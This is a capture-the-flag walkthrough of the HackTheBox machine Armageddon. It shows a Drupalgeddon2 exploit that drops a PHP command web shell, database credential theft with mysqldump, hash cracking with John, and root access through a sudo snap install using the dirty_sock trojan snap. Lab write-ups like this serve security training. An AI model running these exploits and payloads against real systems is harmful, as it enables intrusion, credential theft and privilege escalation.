---
title: "Walk-through of Armageddon from HackTheBox"
header:
  teaser: /assets/images/2021-07-29-22-28-47.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Armageddon
  - Drupal
  - JohnTheRipper
  - MySQLShow
  - MySQLDump
  - Dirty_Sock
---

## Machine Information

![armageddon](/assets/images/2021-07-29-22-28-47.png)

Armageddon is rated as an easy machine on HackTheBox. Our initial scan finds just two open ports, with an out of date Drupal site on port 80. We use a public exploit to gain a shell, then dump user credentials from a MySQL database which we crack using JohnTheRipper. We use these credentials to get a user shell, then use a snapd vulnerability to run the dirty_sock exploit. From there we switch to root to complete the box.

<!--more-->

Skills required are basic port enumeration and OS exploration knowledge. Skills learned are modifying public exploits and cracking hashed passwords.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Armageddon](https://www.hackthebox.eu/home/machines/profile/323) |
| Machine Release Date | 27th March 2021 |
| Date I Completed It | 29th July 2021 |
| Distribution Used | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/armageddon]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.233 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/armageddon]
└─# nmap -p$ports -sC -sV -oA armageddon 10.10.10.233
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 22:24 BST
Nmap scan report for 10.10.10.233
Host is up (0.027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.11 seconds
```

Only two open ports found, let's look at the Drupal site running on port 80:

![armageddon-website](/assets/images/2021-07-27-22-31-36.png)

No obvious way in, and nothing in the source code for the page. Looking back at the Nmap scan we see a number of found files and folders. Let's look at the changelog for a clue to the version we're dealing with:

```text
┌──(root💀kali)-[~/htb/armageddon]
└─# curl http://10.10.10.233/CHANGELOG.txt

Drupal 7.56, 2017-06-21
-----------------------
- Fixed security issues (access bypass). See SA-CORE-2017-003.

Drupal 7.55, 2017-06-07
-----------------------
- Fixed incompatibility with PHP versions 7.0.19 and 7.1.5 due to duplicate
  DATE_RFC7231 definition.
- Made Drupal core pass all automated tests on PHP 7.1.
- Allowed services such as Let's Encrypt to work with Drupal on Apache, by
  making Drupal's .htaccess file allow access to the .well-known directory
  defined by RFC 5785.
- Made new Drupal sites work correctly on Apache 2.4 when the mod_access_compat
  Apache module is disabled.
- Fixed Drupal's URL-generating functions to always encode '[' and ']' so that
  the URLs will pass HTML5 validation.
- Various additional bug fixes.
- Various API documentation improvements.
- Additional automated test coverage.
```

## Searchsploit

So we have Drupal 7.56 from 2017 which is old and probably full of holes. Let's have a look at Searchsploit:

```text
┌──(root💀kali)-[~/htb/armageddon]
└─# searchsploit drupal 7.56
------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                         |  Path
------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                               | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                            | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                    | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                       | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)  | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                         | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                     | php/webapps/46459.py
------------------------------------------------------------------------------------------------------- ---------------------------------
```

Plenty of options. With the box being called Armageddon why not try Drupalgeddon2 for remote code execution. Let's have a look at it:

```text
┌──(root💀kali)-[~/htb/armageddon]
└─# searchsploit -m 44449.rb
  Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/44449
     Path: /usr/share/exploitdb/exploits/php/webapps/44449.rb
File Type: Ruby script, ASCII text, with CRLF line terminators

Copied to: /root/44449.rb
```

A quick look at the script shows it tests for the vulnerability, then drops a payload on the web server root. It then uses remote code execution to interact with the payload giving us a semi-interactive shell.

## Exploit Debugging

All we have to do is point it at the vulnerable Drupal server. Let's try it:

```text
┌──(root💀kali)-[~/htb/armageddon]
└─# ruby 44449.rb http://10.10.10.233/
ruby: warning: shebang line ending with \r may cause problems
Traceback (most recent call last):
        2: from 44449.rb:16:in `<main>'
        1: from /usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require'
/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require': cannot load such file -- highline/import (LoadError)
```

Ok, first problem is line endings aren't correct. Which is usually an issue where they are dos line return characters instead of unix. That's an easy fix:

```text
┌──(root💀kali)-[~/htb/armageddon]
└─# dos2unix 44449.rb
dos2unix: converting file 44449.rb to Unix format...
```

Let's try again:

```text
┌──(root💀kali)-[~/htb/armageddon]
└─# ruby 44449.rb http://10.10.10.233/
Traceback (most recent call last):
        2: from 44449.rb:16:in `<main>'
        1: from /usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require'
/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require': cannot load such file -- highline/import (LoadError)
```

First problem sorted, next problem "cannot load such file -- highline/import". Checking the docs [here](https://github.com/dreadlocked/Drupalgeddon2/), we see this:

```text
Whenever getting a cannot load such file "LoadError" type of error, do run sudo gem install <missing dependency>.
In particular, you may need to install the highline dependency with sudo gem install highline
```

Ok, lets do that:

```text
┌──(root💀kali)-[~/htb/armageddon]
└─# sudo gem install highline
Fetching highline-2.0.3.gem
Successfully installed highline-2.0.3
Parsing documentation for highline-2.0.3
Installing ri documentation for highline-2.0.3
Done installing documentation for highline after 3 seconds
1 gem installed
```

## Fakeshell

Try the exploit again:

```text
┌──(root💀kali)-[~/htb/armageddon]
└─# ruby 44449.rb http://10.10.10.233/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.233/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo PZKUSDYA
[+] Result : PZKUSDYA
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.233/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
armageddon.htb>>
```

## Enumeration

It works, and we now have our semi-interactive shell. Let's have a look around:

```text
armageddon.htb>> whoami
apache

armageddon.htb>> ls /home
ls: cannot open directory /home: Permission denied

armageddon.htb>> grep -v -e '/nologin' -e '/bin/false' -e '/bin/sync' /etc/passwd
root:x:0:0:root:/root:/bin/bash
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```

So we're connected as user apache, we can't see the home folders but we can look at the passwd file. From this we know there is a user called brucetherealadmin. Time to do some enumeration and see what we can find:

```text
armageddon.htb>> pwd
/var/www/html

armageddon.htb>> ls -ls
total 268
112 -rw-r--r--.  1 apache apache 111613 Jun 21  2017 CHANGELOG.txt
  4 -rw-r--r--.  1 apache apache   1481 Jun 21  2017 COPYRIGHT.txt
  4 -rw-r--r--.  1 apache apache   1717 Jun 21  2017 INSTALL.mysql.txt
  4 -rw-r--r--.  1 apache apache   1874 Jun 21  2017 INSTALL.pgsql.txt
  4 -rw-r--r--.  1 apache apache   1298 Jun 21  2017 INSTALL.sqlite.txt
 20 -rw-r--r--.  1 apache apache  17995 Jun 21  2017 INSTALL.txt
 20 -rw-r--r--.  1 apache apache  18092 Nov 16  2016 LICENSE.txt
 12 -rw-r--r--.  1 apache apache   8710 Jun 21  2017 MAINTAINERS.txt
  8 -rw-r--r--.  1 apache apache   5382 Jun 21  2017 README.txt
 12 -rw-r--r--.  1 apache apache  10123 Jun 21  2017 UPGRADE.txt
  8 -rw-r--r--.  1 apache apache   6604 Jun 21  2017 authorize.php
  4 -rw-r--r--.  1 apache apache    720 Jun 21  2017 cron.php
  4 drwxr-xr-x.  4 apache apache   4096 Jun 21  2017 includes
  4 -rw-r--r--.  1 apache apache    529 Jun 21  2017 index.php
  4 -rw-r--r--.  1 apache apache    703 Jun 21  2017 install.php
  4 drwxr-xr-x.  4 apache apache   4096 Dec  4  2020 misc
  4 drwxr-xr-x. 42 apache apache   4096 Jun 21  2017 modules
  0 drwxr-xr-x.  5 apache apache     70 Jun 21  2017 profiles
  4 -rw-r--r--.  1 apache apache   2189 Jun 21  2017 robots.txt
  0 drwxr-xr-x.  2 apache apache    261 Jun 21  2017 scripts
  4 -rw-r--r--.  1 apache apache     75 Jul 28 21:41 shell.php
  0 drwxr-xr-x.  4 apache apache     75 Jun 21  2017 sites
  0 drwxr-xr-x.  7 apache apache     94 Jun 21  2017 themes
 20 -rw-r--r--.  1 apache apache  19986 Jun 21  2017 update.php
  4 -rw-r--r--.  1 apache apache   2200 Jun 21  2017 web.config
  4 -rw-r--r--.  1 apache apache    417 Jun 21  2017 xmlrpc.php

armageddon.htb>> ls -ls sites
total 8
4 -rw-r--r--. 1 apache apache  904 Jun 21  2017 README.txt
0 drwxr-xr-x. 5 apache apache   52 Jun 21  2017 all
0 dr-xr-xr-x. 3 apache apache   67 Dec  3  2020 default
4 -rw-r--r--. 1 apache apache 2365 Jun 21  2017 example.sites.php

armageddon.htb>> ls -ls sites/default
total 56
28 -rw-r--r--. 1 apache apache 26250 Jun 21  2017 default.settings.php
 0 drwxrwxr-x. 3 apache apache    37 Dec  3  2020 files
28 -r--r--r--. 1 apache apache 26565 Dec  3  2020 settings.php
```

We find the settings.php file in the default install location. In there we find some credentials:

```text
armageddon.htb>> cat sites/default/settings.php
<?php
/**
 * @file
 * Drupal site-specific configuration file.
 *
<SNIP>
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

## MySQLShow

I tried these with bruce via SSH but that didn't work, so instead we need to look in the MySQL database. I couldn't use mysql in the fakeshell but [mysqlshow](https://dev.mysql.com/doc/refman/8.0/en/mysqlshow.html) worked. Using the credentials found above we can enumerate the database:

```text
armageddon.htb>> mysqlshow -u drupaluser -p'CQHEy@9M*m23gBVj'
+--------------------+
|     Databases      |
+--------------------+
| information_schema |
| drupal             |
| mysql              |
| performance_schema |
+--------------------+

armageddon.htb>> mysqlshow -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
Database: drupal
+-----------------------------+
|           Tables            |
+-----------------------------+
| actions                     |
| authmap                     |
| batch                       |
| block                       |
| block_custom                |
<SNIP>
| url_alias                   |
| users                       |
| users_roles                 |
| variable                    |
| watchdog                    |
+-----------------------------+

armageddon.htb>> mysqlshow -u drupaluser -p'CQHEy@9M*m23gBVj' drupal users
Database: drupal  Table: users
+------------------+------------------+-----------------+------+-----+---------+-------+---------------------------------+-----------------------------------------------------+
| Field            | Type             | Collation       | Null | Key | Default | Extra | Privileges                      | Comment                                             |
+------------------+------------------+-----------------+------+-----+---------+-------+---------------------------------+-----------------------------------------------------+
| uid              | int(10) unsigned |                 | NO   | PRI | 0       |       | select,insert,update,references | Primary Key: Unique user ID.                        |
| name             | varchar(60)      | utf8_general_ci | NO   | UNI |         |       | select,insert,update,references | Unique user name.                                   |
| pass             | varchar(128)     | utf8_general_ci | NO   |     |         |       | select,insert,update,references | Users password (hashed).                            |
| mail             | varchar(254)     | utf8_general_ci | YES  | MUL |         |       | select,insert,update,references | Users e-mail address.                               |
| theme            | varchar(255)     | utf8_general_ci | NO   |     |         |       | select,insert,update,references | Users default theme.                                |
| signature        | varchar(255)     | utf8_general_ci | NO   |     |         |       | select,insert,update,references | Users signature.                                    |
| signature_format | varchar(255)     | utf8_general_ci | YES  |     |         |       | select,insert,update,references | The filter_format.format of the signature.          |
| created          | int(11)          |                 | NO   | MUL | 0       |       | select,insert,update,references | Timestamp for when user was created.                |
| access           | int(11)          |                 | NO   | MUL | 0       |       | select,insert,update,references | Timestamp for previous time user accessed the site. |
| login            | int(11)          |                 | NO   |     | 0       |       | select,insert,update,references | Timestamp for user�s last login.                   |
+------------------+------------------+-----------------+------+-----+---------+-------+---------------------------------+-----------------------------------------------------+

armageddon.htb>> mysqlshow -u drupaluser -p'CQHEy@9M*m23gBVj' drupal users name
Database: drupal  Table: users  Wildcard: name
+-------+-------------+-----------------+------+-----+---------+-------+---------------------------------+-------------------+
| Field | Type        | Collation       | Null | Key | Default | Extra | Privileges                      | Comment           |
+-------+-------------+-----------------+------+-----+---------+-------+---------------------------------+-------------------+
| name  | varchar(60) | utf8_general_ci | NO   | UNI |         |       | select,insert,update,references | Unique user name. |
+-------+-------------+-----------------+------+-----+---------+-------+---------------------------------+-------------------+

armageddon.htb>> mysqlshow -u drupaluser -p'CQHEy@9M*m23gBVj' drupal users pass
Database: drupal  Table: users  Wildcard: pass
+-------+--------------+-----------------+------+-----+---------+-------+---------------------------------+---------------------------+
| Field | Type         | Collation       | Null | Key | Default | Extra | Privileges                      | Comment                   |
+-------+--------------+-----------------+------+-----+---------+-------+---------------------------------+---------------------------+
| pass  | varchar(128) | utf8_general_ci | NO   |     |         |       | select,insert,update,references | Users password (hashed). |
+-------+--------------+-----------------+------+-----+---------+-------+---------------------------------+---------------------------+
```

## MySQLDump

So we've found a database called drupal, with a table called users, that contains usernames and passwords. We can use another mysql tool to retrieve the contents of the users table. This time we use [mysqldump](https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html) to see it:

```text
armageddon.htb>> mysqldump -u drupaluser -pCQHEy@9M*m23gBVj drupal users
-- MySQL dump 10.14  Distrib 5.5.68-MariaDB, for Linux (x86_64)
--
-- Host: localhost    Database: drupal
-- ------------------------------------------------------
-- Server version       5.5.68-MariaDB
<SNIP>
--
-- Dumping data for table `users`
--
LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (0,'','','','','',NULL,0,0,0,0,NULL,'',0,'',NULL),(1,'brucetherealadmin','$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt','admin@armageddon.eu','','','filtered_html',1606998756,1607077194,1607076276,1,'Europe/London','',0,'admin@armageddon.eu','a:1:{s:7:\"overlay\";i:1;}');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
<SNIP>
-- Dump completed on 2021-07-28 22:32:46
```

## Hash Cracking

We have another password for bruce, this one is hashed. We can assume it will be crackable using JohnTheRipper and rockyou wordlist:

```text
┌──(root💀kali)-[~/htb/armageddon]
└─# echo "$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt" > hash.txt

┌──(root💀kali)-[~/htb/armageddon]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)
1g 0:00:00:00 DONE (2021-07-28 22:38) 2.439g/s 565.8p/s 565.8c/s 565.8C/s tiffany..harley
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## User Flag

That was easy! Let's try SSH now we have another password:

```text
└─# ssh brucetherealadmin@10.10.10.233                                                                        
brucetherealadmin@10.10.10.233's password: 
Last failed login: Wed Jul 28 22:16:23 BST 2021 from 10.10.15.5 on ssh:notty
There were 2 failed login attempts since the last successful login.
Last login: Wed Jul 28 18:37:47 2021 from 10.10.14.83
[brucetherealadmin@armageddon ~]$ 
```

We're in at last. Let's grab the user flag:

```text
[brucetherealadmin@armageddon ~]$ cat user.txt 
<HIDDEN>
```

There's a few things I check before grabbing an enumeration script like LinPEAS, first is sudo permissions:

```text
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY
    HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

## Dirty Sock

We found our escalation path straight away! So bruce can run snap install as root with no password. GTFOBins shows us how to create our own malicious snap package [here](https://gtfobins.github.io/gtfobins/snap/). An easier option is to use the script [here](https://github.com/initstring/dirty_sock) which means we won't have to install fpm.

Within the the dirty_sockv2 script there is this code block:

```text
TROJAN_SNAP = ('''
aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
<SNIP>
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''
               + 'A' * 4256 + '==')
```

That's a malicious snap package that's been base64 encoded. We can just paste that in to our SSH session on the box to create the snap package on there:

```text
[brucetherealadmin@armageddon ~]$ python3 -c "print('aHNxcwcAAAAQII4DAAAAAAAAhgMAAAA///xICAAAAAAAAsAIAAAAAAAA
Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnq2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x
AABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAACAAw'+ 'A' * 4256 + '==')" | base64 -d > pencer.snap
```

One other thing to note in the dirty_sock script is this section:

```text
 post_payload = '''
--------------------------f8c156143a1caf97
Content-Disposition: form-data; name="devmode"
true
```

Now we can install our package:

```text
[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install --devmode pencer.snap
dirty-sock 0.1 installed
```

And now we can switch to the newly created user dirty_sock with password of dirty_sock:

```text
[brucetherealadmin@armageddon ~]$ su dirty_sock
Password:
```

## Root Flag

This account can run anything as root. We can check that by looking at sudo permission:

```text
[dirty_sock@armageddon brucetherealadmin]$ sudo -l
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:
    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.
[sudo] password for dirty_sock: 
Matching Defaults entries for dirty_sock on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User dirty_sock may run the following commands on armageddon:
    (ALL : ALL) ALL
```

All that's left now is switch user to root and grab the flag:

```text
[dirty_sock@armageddon brucetherealadmin]$ sudo su
[root@armageddon brucetherealadmin]# cat /root/root.txt 
<HIDDEN>
```

All done. See you next time.
